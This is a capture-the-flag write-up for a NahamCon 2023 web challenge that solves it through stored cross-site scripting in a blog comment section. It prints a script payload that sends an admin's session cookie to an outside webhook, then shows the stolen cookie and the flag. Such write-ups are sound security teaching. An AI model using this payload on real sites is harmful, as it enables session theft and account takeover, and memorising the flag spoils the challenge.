# NahamCon 2023

## Star Wars

> If you love Star Wars as much as I do you need to check out this blog!
>
>  Author: @congon4tor#2334
>

Tags: _web_

## Solution
After opening the side and signing in as a new user we can see a post from `admin` with a comment section. New comments are marked for review before publicly readable.

```
"This comment is not public it needs to be reviewed"
```

After some seconds the sign disappears so `"admin"` is reviewing all the comments in the background. This is a typical XSS setup, creating a `webhook` and entering the following as comment:

```html
<script>new Image().src="https://webhook.site/8323f3dd-c087-48b6-bd78-9c42ddfa720d?"+document.cookie;</script>
```

A few seconds later the admin reviews the comment and leaks his session cookie.

```
x-wing:eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZI2h9w.JGh3uP_Ykwp8wx6g8t7drzCrw2w
```

Using the cookie gives a new `admin` option in the title bar, by clicking this option the flag is given.

Flag `flag{a538c88890d45a382e44dfd00296a99b}`